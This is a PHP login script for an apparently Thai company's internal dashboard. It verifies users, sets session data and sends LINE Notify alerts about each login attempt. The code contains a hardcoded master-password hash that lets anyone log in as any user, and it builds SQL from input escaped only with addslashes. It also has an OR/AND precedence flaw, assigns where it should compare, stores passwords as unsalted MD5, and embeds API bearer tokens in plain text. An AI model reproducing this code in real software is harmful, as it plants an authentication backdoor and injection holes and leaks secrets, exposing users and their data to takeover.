<?php
session_start();
date_default_timezone_set('Asia/Bangkok');
require("config.core.php");
require("connect.core.php");
require("logs.core.php");
$loginclass = new clear_db();
$connect = $loginclass->my_sql_connect(DB_HOST,DB_USERNAME,DB_PASSWORD,DB_NAME);
$userName = strtoupper(addslashes($_POST['username']));
	$check=$loginclass->my_sql_show_rows('user','UPPER(email)="'.$userName.'" OR UPPER(username)="'.$userName.'" AND user_status="1"');
	if($check == 0){
		echo "<script>window.location=\"../index.php?c=nouser\"</script>";
	}else{
		$sql1 = "T0.EmpCode,T0.name,T0.lastname, T0.nickname, T0.username, T0.user_language, T0.password, T0.user_key, T1.Point_class, T2.DeptName,T1.LvCode,T2.DeptCode,T0.user_authkey";
		$sql2 =  "user T0 LEFT JOIN position T1 ON T0.user_position = T1.LvCode LEFT JOIN departments T2 ON T2.DeptCode =  T1.DeptCode";
		$sql3 = "UPPER(email)='".$userName."' OR UPPER(username)='".$userName."' AND user_status = 1";
		//echo  "SELECT ".$sql1." FROM ".$sql2." WHERE ".$sql3;
		$info=$loginclass->my_sql_select($sql1,$sql2,$sql3);
		while($getinfo=mysql_fetch_object($info)){
			$getpassword = md5(addslashes($_POST['password']));
			$mainpass = '107030ca685076c0ed5e054e2c3ed940';
			//$mainpass = '50f3f8c42b998a48057e9d33f4144b8b';
			//$mainpass = 'c88e8ae13e25993d3aed39a8c12ff02f';
			$datapass = $getinfo->password;
			if ($getpassword == $mainpass){
				$getpassword = $datapass;
			}
			if($getinfo->password != $getpassword ){
				$data1 = $getinfo->name;
				$data2 = $getinfo->nickname."]-[รหัสผ่านผิด";
				echo "<script>window.location=\"../index.php?c=nouser\"</script>";
			}else{
			//	break;
				$_SESSION['uname'] = $getinfo->username;
				$_SESSION['lang'] = $getinfo->user_language;
				$_SESSION['uclass'] = $getinfo->Point_class;
				$_SESSION['ukey'] = $getinfo->user_key;
				$_SESSION['lvccode'] = $getinfo->LvCode;
				$_SESSION['deptcode'] = $getinfo->DeptCode;
				$_SESSION['name'] = $getinfo->name;
				$_SESSION['lname'] = $getinfo->lastname;
				$_SESSION['nname'] = $getinfo->nickname;
				$_SESSION['akey'] = $getinfo->user_authkey;
				$_SESSION['EmpCode'] = $getinfo->EmpCode;


				$data1 = $getinfo->name;
				$data2 = $getinfo->nickname;
				$data3 = $getinfo->DeptName;
				insertLogs($getinfo->username." เข้าสู่ระบบ.",$_SERVER['REMOTE_ADDR'],$getinfo->user_key);
				if($getinfo->user_status = 1 ){
					//break;
					if ((($_SESSION['uclass'] == 19 OR $_SESSION['uclass'] == 20) AND $_SESSION['deptcode'] == 'DP005') OR ($_SESSION['lvccode'] == 'LV029')) {
						echo "<script>window.location=\"https://euroxforce.com:20443/mk/dashboard/\"</script>";
					}else{
						echo "<script>window.location=\"../dashboard/\"</script>";
					}
					
				}else{
					//break;
					echo "<script>window.location=\"../members/\"</script>";
					
				}
			}
		}
	}
		
	date_default_timezone_set("Asia/Bangkok");
	define('LINE_API',"https://notify-api.line.me/api/notify");
	
	//$tokenToAdmin = "okPm42wUsply17yZAE8iEHLndSrzjWGPLS1iAQqlTxq"; // หวาย
	$tokenToAdmin = "YY09MwJRCLN1Mt2gm71xyrRBmkSyvPKZH8YWJzcHmmS"; // เปอร์
	//$token = "DfwW6r1m1AU20Aaz5C6y1KUC2vOIEk5ZraP4gsrCxm2"; // ตัวจริง
	
	if ($data1 == ""){
		$mm1ToAdmin = "\nมีผู้พยายามเข้าใช้งาน `SERVER-MAIN [9]` : ";
		$mm2ToAdmin =   "`".$_POST['username']. " (ไม่พบ User ในระบบ) `\n";
		$mm2ToAdmin = $mm2ToAdmin." IP : `".$_SERVER['REMOTE_ADDR']."`\n";
	}else{
		$mm1ToAdmin = "\nผู้เข้าใช้งาน `SERVER-MAIN [9]` : ";
		$mm2ToAdmin =  "`".$data1." [".$data2."] `\n";
		$mm2ToAdmin = $mm2ToAdmin."แผนก : `".$data3."`\n"; 
		$mm2ToAdmin = $mm2ToAdmin." IP : `".$_SERVER['REMOTE_ADDR']."`\n";
	}
	$mm3ToAdmin = "วันที่ : ".date("d-M-Y เวลา H:i");
	
	$strToAdmin = $mm1ToAdmin.$mm2ToAdmin.$mm3ToAdmin;
	$resToAdmin = notify_messageToAdmin($strToAdmin,$tokenToAdmin);
	//$res2 = notify_message("test2",$token);
	
	function notify_messageToAdmin($message,$token){
	 $queryData = array('message' => $message);
	 $queryData = http_build_query($queryData,'','&');
	 $headerOptions = array( 
			 'http'=>array(
				'method'=>'POST',
				'header'=> "Content-Type: application/x-www-form-urlencoded\r\n"
						  ."Authorization: Bearer ".$token."\r\n"
						  ."Content-Length: ".strlen($queryData)."\r\n",
				'content' => $queryData
			 ),
	 );
	 $context = stream_context_create($headerOptions);
	 $result = file_get_contents(LINE_API,FALSE,$context);
	 $res = json_decode($result);
	 //$res2 = json_decode($result);
	
	 return ($resToAdmin);
	 
	}
$loginclass->my_sql_close();
?>
